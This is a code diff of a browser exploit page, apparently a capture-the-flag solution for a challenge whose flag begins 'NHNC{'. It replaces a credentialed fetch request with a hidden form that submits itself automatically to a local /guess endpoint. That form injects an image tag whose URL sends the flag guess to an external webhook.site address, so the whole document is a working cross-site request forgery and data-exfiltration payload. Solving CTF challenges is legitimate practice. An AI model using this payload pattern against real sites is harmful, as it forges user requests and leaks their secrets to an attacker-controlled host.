@@ -1,15 +1,17 @@
 <script>
-  const blob = new Blob([`<html><body><scr` + `ipt>
-    fetch('http://127.0.0.1:5000/guess', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: 'guess=NHNC%7B&note=%3Cimg%20src%3Dhttp%3A%2F%2Fwebhook.site%2Fabc123%3E'
-    });
-  </scr` + `ipt></body></html>`], { type: 'text/html' });
+  const html = `
+  <html><body>
+    <form action="http://127.0.0.1:5000/guess" method="POST">
+      <input name="guess" value="NHNC{" hidden>
+      <input name="note" value='<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">' hidden>
+      <button type="submit">submit</button>
+    </form>
+    <script>document.forms[0].submit()</scr` + `ipt>
+  </body></html>
+`;
 
-  const url = URL.createObjectURL(blob);
-  window.open(url);
+const blob = new Blob([html], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+window.open(url);
+
 </script>
